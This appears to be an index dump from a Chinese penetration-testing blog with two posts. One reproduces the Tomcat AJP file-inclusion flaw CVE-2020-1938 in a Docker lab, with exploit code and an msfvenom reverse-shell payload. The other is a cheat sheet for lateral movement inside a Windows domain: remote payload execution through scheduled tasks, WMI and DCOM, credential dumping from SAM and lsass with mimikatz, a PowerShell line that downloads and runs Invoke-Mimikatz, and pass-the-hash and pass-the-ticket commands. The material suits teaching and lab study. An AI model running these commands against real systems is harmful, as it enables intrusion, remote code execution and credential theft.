version:'2'services:tomcat:image:vulhub/tomcat:9.0.30ports:- \"8080:8080\"- \"8009:8009\" 启动镜像： docker-compose up -d ","date":"2020-02-21","objectID":"/2020/02/cve-2020-1938-apache-tomcat-ajp-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/:1:1","tags":["Tomcat","漏洞复现"],"title":"CVE-2020-1938 Apache Tomcat AJP 文件包含漏洞复现","uri":"/2020/02/cve-2020-1938-apache-tomcat-ajp-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/"},{"categories":["漏洞复现"],"content":"POC 来源：https://github.com/nibiwodong/CNVD-2020-10487-Tomcat-ajp-POC 原作者的 poc 只能读文件，将原作者 poc 的 self.req_uri = req_uri 改为 self.req_uri = req_uri + \".jsp\" 即可文件包含，从而反弹 shell。 #!/usr/bin/env python import struct # Some references: # https://tomcat.apache.org/connectors-doc/ajp/ajpv13a.html def pack_string(s): if s is None: return struct.pack(\"\u003eh\", -1) l = len(s) return struct.pack(\"\u003eH%dsb\" % l, l, s.encode('utf8'), 0) def unpack(stream, fmt): size = struct.calcsize(fmt) buf = stream.read(size) return struct.unpack(fmt, buf) def unpack_string(stream): size, = unpack(stream, \"\u003eh\") if size == -1: # null string return None res, = unpack(stream, \"%ds\" % size) stream.read(1) # \\0 return res class NotFoundException(Exception): pass class AjpBodyRequest(object): # server == web server, container == servlet SERVER_TO_CONTAINER, CONTAINER_TO_SERVER = range(2) MAX_REQUEST_LENGTH = 8186 def __init__(self, data_stream, data_len, data_direction=None): self.data_stream = data_stream self.data_len = data_len self.data_direction = data_direction def serialize(self): data = self.data_stream.read(AjpBodyRequest.MAX_REQUEST_LENGTH) if len(data) == 0: return struct.pack(\"\u003ebbH\", 0x12, 0x34, 0x00) else: res = struct.pack(\"\u003eH\", len(data)) res += data if self.data_direction == AjpBodyRequest.SERVER_TO_CONTAINER: header = struct.pack(\"\u003ebbH\", 0x12, 0x34, len(res)) else: header = struct.pack(\"\u003ebbH\", 0x41, 0x42, len(res)) return header + res def send_and_receive(self, socket, stream): while True: data = self.serialize() socket.send(data) r = AjpResponse.receive(stream) while r.prefix_code != AjpResponse.GET_BODY_CHUNK and r.prefix_code != AjpResponse.SEND_HEADERS: r = AjpResponse.receive(stream) if r.prefix_code == AjpResponse.SEND_HEADERS or len(data) == 4: break class AjpForwardRequest(object): _, OPTIONS, GET, HEAD, POST, PUT, DELETE, TRACE, PROPFIND, PROPPATCH, MKCOL, COPY, MOVE, LOCK, UNLOCK, ACL, REPORT, VERSION_CONTROL, CHECKIN, CHECKOUT, UNCHECKOUT, SEARCH, MKWORKSPACE, UPDATE, LABEL, MERGE, BASELINE_CONTROL, MKACTIVITY = range(28) REQUEST_METHODS = {'GET': GET, 'POST': POST, 'HEAD': HEAD, 'OPTIONS': OPTIONS, 'PUT': PUT, 'DELETE': DELETE, 'TRACE': TRACE} # server == web server, container == servlet SERVER_TO_CONTAINER, CONTAINER_TO_SERVER = range(2) COMMON_HEADERS = [\"SC_REQ_ACCEPT\", \"SC_REQ_ACCEPT_CHARSET\", \"SC_REQ_ACCEPT_ENCODING\", \"SC_REQ_ACCEPT_LANGUAGE\", \"SC_REQ_AUTHORIZATION\", \"SC_REQ_CONNECTION\", \"SC_REQ_CONTENT_TYPE\", \"SC_REQ_CONTENT_LENGTH\", \"SC_REQ_COOKIE\", \"SC_REQ_COOKIE2\", \"SC_REQ_HOST\", \"SC_REQ_PRAGMA\", \"SC_REQ_REFERER\", \"SC_REQ_USER_AGENT\" ] ATTRIBUTES = [\"context\", \"servlet_path\", \"remote_user\", \"auth_type\", \"query_string\", \"route\", \"ssl_cert\", \"ssl_cipher\", \"ssl_session\", \"req_attribute\", \"ssl_key_size\", \"secret\", \"stored_method\"] def __init__(self, data_direction=None): self.prefix_code = 0x02 self.method = None self.protocol = None self.req_uri = None self.remote_addr = None self.remote_host = None self.server_name = None self.server_port = None self.is_ssl = None self.num_headers = None self.request_headers = None self.attributes = None self.data_direction = data_direction def pack_headers(self): self.num_headers = len(self.request_headers) res = \"\" res = struct.pack(\"\u003eh\", self.num_headers) for h_name in self.request_headers: if h_name.startswith(\"SC_REQ\"): code = AjpForwardRequest.COMMON_HEADERS.index(h_name) + 1 res += struct.pack(\"BB\", 0xA0, code) else: res += pack_string(h_name) res += pack_string(self.request_headers[h_name]) return res def pack_attributes(self): res = b\"\" for attr in self.attributes: a_name = attr['name'] code = AjpForwardRequest.ATTRIBUTES.index(a_name) + 1 res += struct.pack(\"b\", code) if a_name == \"req_attribute\": aa_name, a_value = attr['value'] res += pack_string(aa_name) res += pack_string(a_value) else: res += pack_string(attr['value']) res += struct.pack(\"B\", 0xFF) return res def serialize(self): res = \"\" res = struct.pack(\"bb\", self.prefix_code, self.method) res += pack_string(self.protocol) res += pac","date":"2020-02-21","objectID":"/2020/02/cve-2020-1938-apache-tomcat-ajp-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/:1:2","tags":["Tomcat","漏洞复现"],"title":"CVE-2020-1938 Apache Tomcat AJP 文件包含漏洞复现","uri":"/2020/02/cve-2020-1938-apache-tomcat-ajp-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/"},{"categories":["漏洞复现"],"content":"反弹 shell msfvenom 生成 webshell msfvenom -p java/jsp_shell_reverse_tcp LHOST=IP LPORT=4444 \u003e shell.txt 上传文件 由于该漏洞要配合 文件上传 ，再进行文件包含，进而执行命令： # 查看容器 ID docker ps -a docker cp shell.txt 容器ID:/usr/local/tomcat/webapps/ROOT/shell.txt 查看文件： 启动 msf 监听 执行修改后的 exp： python2 poc.py 127.0.0.1 -p 8009 -f \"/shell.txt\" 注意：本人在测试时，使用一般的传参数的 webshell 时无法正确解析，可以进一步修改脚本解决。 成功弹回 shell ","date":"2020-02-21","objectID":"/2020/02/cve-2020-1938-apache-tomcat-ajp-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/:1:3","tags":["Tomcat","漏洞复现"],"title":"CVE-2020-1938 Apache Tomcat AJP 文件包含漏洞复现","uri":"/2020/02/cve-2020-1938-apache-tomcat-ajp-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/"},{"categories":["内网渗透"],"content":"域内横向移动分析相关","date":"2020-02-17","objectID":"/2020/02/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%88%86%E6%9E%90/","tags":["域安全","内网渗透","横向移动"],"title":"域内横向移动分析","uri":"/2020/02/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%88%86%E6%9E%90/"},{"categories":["内网渗透"],"content":"域内横向移动分析 ","date":"2020-02-17","objectID":"/2020/02/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%88%86%E6%9E%90/:0:0","tags":["域安全","内网渗透","横向移动"],"title":"域内横向移动分析","uri":"/2020/02/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%88%86%E6%9E%90/"},{"categories":["内网渗透"],"content":"常用 Windows 远程连接和相关命令 ","date":"2020-02-17","objectID":"/2020/02/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%88%86%E6%9E%90/:1:0","tags":["域安全","内网渗透","横向移动"],"title":"域内横向移动分析","uri":"/2020/02/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%88%86%E6%9E%90/"},{"categories":["内网渗透"],"content":"IPC net use \\\\IP\\ipc$ \"password\" /user:Administrator IPC 的利用条件 开启 139 端口 管理员开启了默认共享 ","date":"2020-02-17","objectID":"/2020/02/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%88%86%E6%9E%90/:1:1","tags":["域安全","内网渗透","横向移动"],"title":"域内横向移动分析","uri":"/2020/02/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%88%86%E6%9E%90/"},{"categories":["内网渗透"],"content":"使用 Windows 自带的工具获取远程主机信息 dir 命令 dir \\\\IP\\c$ tasklist 命令 tasklist /S IP /U administrator /P password ","date":"2020-02-17","objectID":"/2020/02/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%88%86%E6%9E%90/:1:2","tags":["域安全","内网渗透","横向移动"],"title":"域内横向移动分析","uri":"/2020/02/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%88%86%E6%9E%90/"},{"categories":["内网渗透"],"content":"计划任务 at 命令 主要在 Windows server 2008 之前版本 查看目标系统时间 net time \\\\IP 将 payload 复制到目标系统中 copy payload.bat \\\\IP\\C$ 使用 at 命令创建计划任务 at \\\\IP 8:00AM C:\\payload.bat 返回一个计划任务 ID 清除 at 记录 at \\\\IP taskID /delete 使用 at 将执行结果保存到远程，再读取结果： at \\\\IP 8:00AM cmd.exe /c \"ipconfig \u003e C:/1.txt\" type \\\\IP\\C$\\1.txt schtask 命令 建立 IPC 连接 创建名为 task 的计划任务 schtask /create /s IP /tn test /sc onstart /tr c:\\payload.bat /ru system /f 执行该计划任务 schtask /run /s IP /i /tn \"test\" 删除计划任务 schtask /delete /s IP /tn \"test\" /f ","date":"2020-02-17","objectID":"/2020/02/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%88%86%E6%9E%90/:1:3","tags":["域安全","内网渗透","横向移动"],"title":"域内横向移动分析","uri":"/2020/02/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%88%86%E6%9E%90/"},{"categories":["内网渗透"],"content":"Windows 系统散列值获取 ","date":"2020-02-17","objectID":"/2020/02/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%88%86%E6%9E%90/:2:0","tags":["域安全","内网渗透","横向移动"],"title":"域内横向移动分析","uri":"/2020/02/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%88%86%E6%9E%90/"},{"categories":["内网渗透"],"content":"单机密码抓取 GetPass GetPassword_x64.exe PwDump7 PwDump7.exe 通过 SAM 和 SYSTEM 文件抓取密码 导出 SAM 和 System 文件 reg save hklm\\sam sam.hive reg save hklm\\system system.hive 通过读取 SAM 和 System 文件获得 NTLM Hash mimikatz lsadump::sam /sam:sam.hive system:system.hive cain 目标机器使用 mimikatz 直接读取本地 SAM 文件 privilege::debug lsadump::sam 使用 mimikatz 在线读取 SAM 文件 mimikatz.exe \"privilege::debug\" \"log\" \"sekurlsa::loginpasswords\" 使用 mimikatz 离线读取 lass.dmp 文件 导出 lass.dmp 文件 使用任务管理器导出 lsass.dmp 文件 任务管理器找到 lsass.exe 进程，右键，选择 “Create Dump File” 选项 使用 Procdump 导出 lsass.dmp 文件 微软官方发布的工具，免杀 Procdump.exe -accepteula -ma lsass.exe lsass.dmp 使用 mimikatz 导出 lsass.dmp 文件中的密码值 sekurlsa::mimidump lsass.dmp sekurlsa::logonpasswords full 使用 Powershell 对散列值进行 Dump 操作 Import-Module .\\Get-PassHashes.ps1 使用 Powershell 远程加载 mimikatz 抓取散列值和明文密码 powershell \"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mattifestation/PwoerSploit/master/Exfilration/Invoke-Mimikatz.ps1');Invoke-Mimikatz\" ","date":"2020-02-17","objectID":"/2020/02/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%88%86%E6%9E%90/:2:1","tags":["域安全","内网渗透","横向移动"],"title":"域内横向移动分析","uri":"/2020/02/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%88%86%E6%9E%90/"},{"categories":["内网渗透"],"content":"哈希传递攻击 ","date":"2020-02-17","objectID":"/2020/02/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%88%86%E6%9E%90/:3:0","tags":["域安全","内网渗透","横向移动"],"title":"域内横向移动分析","uri":"/2020/02/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%88%86%E6%9E%90/"},{"categories":["内网渗透"],"content":"使用 NTLM Hash 进行哈希传递 mimikatz \"privilege::debug\" \"sekurlsa::pth /user:administrator /domain:pentest.hacker /ntlm:[NTLM]\" ","date":"2020-02-17","objectID":"/2020/02/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%88%86%E6%9E%90/:3:1","tags":["域安全","内网渗透","横向移动"],"title":"域内横向移动分析","uri":"/2020/02/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%88%86%E6%9E%90/"},{"categories":["内网渗透"],"content":"使用 AES-256 密钥进行哈希传递 使用 mimikatz 抓取 AES-256 密钥 mimikatz \"privilege::debug\" \"sekurlsa::ekeys\" pth攻击（目标机器必须安装 KB2871997） mimikatz \"privilege::debug\" \"sekurlsa::pth /user:administrator /domain:pentest.hacker /aes256:[aes256]\" ","date":"2020-02-17","objectID":"/2020/02/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%88%86%E6%9E%90/:3:2","tags":["域安全","内网渗透","横向移动"],"title":"域内横向移动分析","uri":"/2020/02/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%88%86%E6%9E%90/"},{"categories":["内网渗透"],"content":"票据传递 ","date":"2020-02-17","objectID":"/2020/02/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%88%86%E6%9E%90/:4:0","tags":["域安全","内网渗透","横向移动"],"title":"域内横向移动分析","uri":"/2020/02/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%88%86%E6%9E%90/"},{"categories":["内网渗透"],"content":"使用 mimikatz 进行票据传递 导出票据 mimikatz \"privilege::debug\" \"sekurlsa::tickets /exports\" 注入票据 mimikatz \"kerberos::ptt\" \"C:\\xxx.kirbi\" ","date":"2020-02-17","objectID":"/2020/02/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%88%86%E6%9E%90/:4:1","tags":["域安全","内网渗透","横向移动"],"title":"域内横向移动分析","uri":"/2020/02/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%88%86%E6%9E%90/"},{"categories":["内网渗透"],"content":"使用 kekeo 进行票据传递 生成票据文件 kekeo \"tgt:ask /user:administrator /domain:pentest.hack /ntlm:[NTLM]\" 将票据文件导入内存 kekeo \"kerberos::ptt xxx.kirbi\" ","date":"2020-02-17","objectID":"/2020/02/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%88%86%E6%9E%90/:4:2","tags":["域安全","内网渗透","横向移动"],"title":"域内横向移动分析","uri":"/2020/02/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%88%86%E6%9E%90/"},{"categories":["内网渗透"],"content":"PsExec 的使用 ","date":"2020-02-17","objectID":"/2020/02/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%88%86%E6%9E%90/:5:0","tags":["域安全","内网渗透","横向移动"],"title":"域内横向移动分析","uri":"/2020/02/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%88%86%E6%9E%90/"},{"categories":["内网渗透"],"content":"PsTools 工具中的 PsExec 建立 IPC 连接 net use \\\\IP\\ipc$ \"password\" /u:administrator 获取 System 权限的 交互式shell PsExec.exe -accepteula \\\\IP -s cmd.exe 或 PsExec.exe -accepteula \\\\IP -s cmd.exe /c ipconfig 如果不使用 -s 命令，则创建一个 Administrator 权限的 shell 如果没有建立 IPC 连接： PsExec.exe -accepteula \\\\IP -u administrator -p password -s cmd.exe ","date":"2020-02-17","objectID":"/2020/02/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%88%86%E6%9E%90/:5:1","tags":["域安全","内网渗透","横向移动"],"title":"域内横向移动分析","uri":"/2020/02/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%88%86%E6%9E%90/"},{"categories":["内网渗透"],"content":"Metasploit 中的 psexec 模块 exploit/windows/smb/psexec exploit/windows/smb/psexec_psh（powershell 版本） ","date":"2020-02-17","objectID":"/2020/02/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%88%86%E6%9E%90/:5:2","tags":["域安全","内网渗透","横向移动"],"title":"域内横向移动分析","uri":"/2020/02/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%88%86%E6%9E%90/"},{"categories":["内网渗透"],"content":"WMI 的使用 ","date":"2020-02-17","objectID":"/2020/02/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%88%86%E6%9E%90/:6:0","tags":["域安全","内网渗透","横向移动"],"title":"域内横向移动分析","uri":"/2020/02/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%88%86%E6%9E%90/"},{"categories":["内网渗透"],"content":"基本命令 wmic /node:IP /user:administrator /password:passed process call create \"cmd.exe /c ipconfig \u003e ip.txt\" 建立 IPC 连接后，使用 type 命令读取结果： type \\\\IP\\C$\\ip.txt ","date":"2020-02-17","objectID":"/2020/02/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%88%86%E6%9E%90/:6:1","tags":["域安全","内网渗透","横向移动"],"title":"域内横向移动分析","uri":"/2020/02/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%88%86%E6%9E%90/"},{"categories":["内网渗透"],"content":"impacket 包中的 wmiexec wmiexec.py administrator:password@IP ","date":"2020-02-17","objectID":"/2020/02/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%88%86%E6%9E%90/:6:2","tags":["域安全","内网渗透","横向移动"],"title":"域内横向移动分析","uri":"/2020/02/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%88%86%E6%9E%90/"},{"categories":["内网渗透"],"content":"wmiexec.vbs 半交互式 shell cscript.exe //nologo wmiexec.vbs /shell IP administrator password 执行单条命令 cscript.exe wmiexec.vbs /cmd IP administrator password \"ipconfig\" 对于运行时间较长的命令，例如 ping、systeminfo，需要加入 -wait 5000 命令或者更长等待时间。在运行 nc 等不需要输出单需要一直等待运行的进程时，需要使用 -persist 参数。 ","date":"2020-02-17","objectID":"/2020/02/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%88%86%E6%9E%90/:6:3","tags":["域安全","内网渗透","横向移动"],"title":"域内横向移动分析","uri":"/2020/02/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%88%86%E6%9E%90/"},{"categories":["内网渗透"],"content":"Invoke-WmiCommand powersploit工具包中 将 Invoke-Wmicommand.ps1 导入系统 $User = \"pentest.hacker\\administrator\" $Password = ConvertTo-SecureString -String \"password\" -AsPlainText -Force $Cred = New-Object -TypeName System.Management.AutoMation.PSCredential -ArgumentList $User, $Password $Remote = Invoke-WmiCommand -Payload {ipconfig} -Credential $Cred -ComputerName IP $Remore.PayloadOutput ","date":"2020-02-17","objectID":"/2020/02/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%88%86%E6%9E%90/:6:4","tags":["域安全","内网渗透","横向移动"],"title":"域内横向移动分析","uri":"/2020/02/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%88%86%E6%9E%90/"},{"categories":["内网渗透"],"content":"Invoke-WMIMethod 利用 powershell 自带的 Invoke-WMIMethod ，非交互，无回显。 $User = \"pentest.hacker\\administrator\" $Password = ConvertTo-SecureString -String \"password\" -AsPlainText -Force $Cred = New-Object -TypeName System.Management.AutoMation.PSCredential -ArgumentList $User, $Password $Remote = Invoke-WMIMethod -Class Win32_Process -Name Create -ArgumentList \"calc.exe\" -Credential $Cred -ComputerName IP ","date":"2020-02-17","objectID":"/2020/02/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%88%86%E6%9E%90/:6:5","tags":["域安全","内网渗透","横向移动"],"title":"域内横向移动分析","uri":"/2020/02/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%88%86%E6%9E%90/"},{"categories":["内网渗透"],"content":"永恒之蓝漏洞 auxiliary/scanner/smb/smb_ms17_010 exploit/windows/smb/ms17_010_eternalblue ","date":"2020-02-17","objectID":"/2020/02/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%88%86%E6%9E%90/:7:0","tags":["域安全","内网渗透","横向移动"],"title":"域内横向移动分析","uri":"/2020/02/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%88%86%E6%9E%90/"},{"categories":["内网渗透"],"content":"smbexec ","date":"2020-02-17","objectID":"/2020/02/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%88%86%E6%9E%90/:8:0","tags":["域安全","内网渗透","横向移动"],"title":"域内横向移动分析","uri":"/2020/02/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%88%86%E6%9E%90/"},{"categories":["内网渗透"],"content":"C++ 版本 smbexec 将 execserver.exe 上传到到目标系统的 C:\\Windows\\ 目录下，解除 UAC 对命令的限制。 net use \\\\IP \"password\" /user:pentest\\administrator test.exe IP administrator password whoami c$ ","date":"2020-02-17","objectID":"/2020/02/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%88%86%E6%9E%90/:8:1","tags":["域安全","内网渗透","横向移动"],"title":"域内横向移动分析","uri":"/2020/02/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%88%86%E6%9E%90/"},{"categories":["内网渗透"],"content":"impacket 工具包中的 smbexec.py smbexec.py penteer/administrator:password\\@IP ","date":"2020-02-17","objectID":"/2020/02/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%88%86%E6%9E%90/:8:2","tags":["域安全","内网渗透","横向移动"],"title":"域内横向移动分析","uri":"/2020/02/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%88%86%E6%9E%90/"},{"categories":["内网渗透"],"content":"DCOM 在远程系统中的使用 ","date":"2020-02-17","objectID":"/2020/02/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%88%86%E6%9E%90/:9:0","tags":["域安全","内网渗透","横向移动"],"title":"域内横向移动分析","uri":"/2020/02/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%88%86%E6%9E%90/"},{"categories":["内网渗透"],"content":"通过本地 DCOM 执行命令 获取 DCOM 程序列表 windows server 2012 及以上 Get-CimInstance Win32_DCOMApplicatioon Windows 7、Windows Server 2008 Get-WmicObject -Namespace ROOT\\CIMV2 -Class Win32_DCOMApplication 使用 DCOM 执行任意命令 本地启动一个管理员权限的 powershell [System.Activator]::CreateInstance([type]::GetTypeFromProgID(\"MMC20.Application\",\"127.0.0.1\")).Document.ActiveView.ExecuteShellCommand(\"cmd.exe\",\"0\",\"/c calc.exe\",\"Minimzed\") ","date":"2020-02-17","objectID":"/2020/02/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%88%86%E6%9E%90/:9:1","tags":["域安全","内网渗透","横向移动"],"title":"域内横向移动分析","uri":"/2020/02/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%88%86%E6%9E%90/"},{"categories":["内网渗透"],"content":"使用 DCOM 在远程机器上执行命令 远程连接时必须使用具有本地管理员权限的账号 使用 IPC$ 连接远程计算机 net use \\\\IP \"password\" /user:pentest.hacker\\win7user 执行命令 调用 MMC20_Application 远程执行命令 $com=[Activator]::CreateInstance([type]::GetTypeFromProgID(\"MMC20.Application\",\"IP\")) $com.Document.ActiveView.ExecuteShellCommand(\"cmd.exe\",\"0\",\"/c calc.exe\",\"Minimzed\") 调用 9BA05972-F6A8-11CF-A442-00A0C90A8F39 $com=[Type]::GetTypeFromCLSID('9BA05972-F6A8-11CF-A442-00A0C90A8F39',\"IP\") $obj=[System.Activator]::CreateInstance($com) $item=$obj.item() $item.Document.Application.ShellExecute(\"cmd.exe\",\"/c calc.exe\",\"c:\\windows\\system32\",\"$null\",0) ","date":"2020-02-17","objectID":"/2020/02/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%88%86%E6%9E%90/:9:2","tags":["域安全","内网渗透","横向移动"],"title":"域内横向移动分析","uri":"/2020/02/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%88%86%E6%9E%90/"},{"categories":["内网渗透"],"content":"SPN 在域环境中的使用 ","date":"2020-02-17","objectID":"/2020/02/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%88%86%E6%9E%90/:10:0","tags":["域安全","内网渗透","横向移动"],"title":"域内横向移动分析","uri":"/2020/02/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%88%86%E6%9E%90/"},{"categories":["内网渗透"],"content":"SPN 扫描 PowerShell-AD-Recon 利用 SPN 发现域中所有的 MSSQL 服务 Import-Module .\\Discover-PSMSSQLServer.ps1 Discover-PSMSSQLServers 扫描域中所有的 SPN 信息 Import-Module .\\Discover-PSInterestingServices.ps1 Discover-PSInterestingServices 在不使用第三方 Powershell 脚本的情况下，输入如下命令查询所有的 SPN 信息 setspn -T domain -q */* ","date":"2020-02-17","objectID":"/2020/02/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%88%86%E6%9E%90/:10:1","tags":["域安全","内网渗透","横向移动"],"title":"域内横向移动分析","uri":"/2020/02/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%88%86%E6%9E%90/"},{"categories":["内网渗透"],"content":"Exchange 邮件服务器攻击 ","date":"2020-02-17","objectID":"/2020/02/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%88%86%E6%9E%90/:10:2","tags":["域安全","内网渗透","横向移动"],"title":"域内横向移动分析","uri":"/2020/02/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%88%86%E6%9E%90/"},{"categories":["内网渗透"],"content":"Exchange 服务发现 基于端口扫描发现 nmap -A -O -sV IP SPN 查询 setspn -T pentest.hacker -F -Q */* ","date":"2020-02-17","objectID":"/2020/02/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%88%86%E6%9E%90/:10:3","tags":["域安全","内网渗透","横向移动"],"title":"域内横向移动分析","uri":"/2020/02/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%88%86%E6%9E%90/"},{"categories":["内网渗透"],"content":"Exchange 的基本操作 查看邮件数据库 add-pssnapin microsoft.exchange* Get-MailboxDatabase -server \"Exchange1\" 指定数据库，对其进行详细信息查询 Get-MailboxDatabase -Identify 'Mailbox Database 1894576043' | Format-List Name,EdbFilePath,LogFolderPath 获取现有用户的邮件地址 Get-Mailbox | format-tables Name,WindowsEmailAddress 查看指定用户的邮箱使用信息 Get-Mailboxstatistics -identify administrator | Select DisplayName,ItemCount,TotalItemSize,LastLogonTime 获取用户邮箱中的邮件数量 Get-Mailbox -ResultSize Unlimited | Get-MailboxStatistics | Sort-Object TotalItemSize -Decend 